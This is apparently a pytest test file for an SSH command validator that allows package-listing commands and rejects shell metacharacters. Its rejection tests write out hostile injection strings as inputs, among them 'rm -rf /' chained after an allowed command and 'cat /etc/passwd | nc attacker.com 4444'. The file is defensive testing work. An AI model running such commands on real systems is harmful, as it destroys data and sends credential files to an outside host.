from __future__ import annotations

import pytest

from aila.platform.tools.ssh import _validate_ssh_command


class TestAllowlistedCommandsPass:
    """Allowlisted commands pass through without raising."""

    def test_dpkg_query(self):
        _validate_ssh_command("dpkg-query -W -f='${Package}\t${Version}\n'")

    def test_apt_list(self):
        _validate_ssh_command("apt list --installed")

    def test_apk_info(self):
        _validate_ssh_command("apk info -v")

    def test_pacman_query(self):
        _validate_ssh_command("pacman -Q")

    def test_cat_etc_os_release(self):
        _validate_ssh_command("cat /etc/os-release")

    def test_uname_r(self):
        _validate_ssh_command("uname -r")

    def test_lsb_release(self):
        _validate_ssh_command("lsb_release -a")

    def test_rpm_qa(self):
        _validate_ssh_command("rpm -qa")

    def test_yum_list(self):
        _validate_ssh_command("yum list installed")

    def test_dnf_list(self):
        _validate_ssh_command("dnf list installed")

    def test_zypper_packages(self):
        _validate_ssh_command("zypper packages --installed-only")


class TestPrefixRejection:
    """Commands not starting with an allowlisted prefix raise ValueError."""

    def test_echo_rejected(self):
        with pytest.raises(ValueError, match="rejected"):
            _validate_ssh_command("echo hello")

    def test_ls_rejected(self):
        with pytest.raises(ValueError, match="rejected"):
            _validate_ssh_command("ls /tmp")


class TestMetacharacterRejection:
    """Commands containing shell metacharacters raise ValueError."""

    def test_semicolon(self):
        with pytest.raises(ValueError, match="rejected"):
            _validate_ssh_command("dpkg-query -W; rm -rf /")

    def test_double_ampersand(self):
        with pytest.raises(ValueError, match="rejected"):
            _validate_ssh_command("apt list && curl attacker.com")

    def test_double_pipe(self):
        with pytest.raises(ValueError, match="rejected"):
            _validate_ssh_command("uname -r || true")

    def test_pipe(self):
        with pytest.raises(ValueError, match="rejected"):
            _validate_ssh_command("cat /etc/passwd | nc attacker.com 4444")

    def test_command_substitution_dollar(self):
        with pytest.raises(ValueError, match="rejected"):
            _validate_ssh_command("dpkg-query $(id)")

    def test_backtick(self):
        with pytest.raises(ValueError, match="rejected"):
            _validate_ssh_command("uname `id`")

    def test_redirect_out(self):
        with pytest.raises(ValueError, match="rejected"):
            _validate_ssh_command("cat /etc/passwd > /tmp/out")

    def test_redirect_in(self):
        with pytest.raises(ValueError, match="rejected"):
            _validate_ssh_command("cat /etc/passwd < /dev/urandom")


class TestMetacharacterBeforePrefix:
    """Metacharacter check fires before prefix check (D-02 ordering)."""

    def test_allowlisted_prefix_with_metachar_rejected(self):
        # dpkg-query is allowlisted but contains ';'
        with pytest.raises(ValueError, match="metacharacter"):
            _validate_ssh_command("dpkg-query -W; rm -rf /")
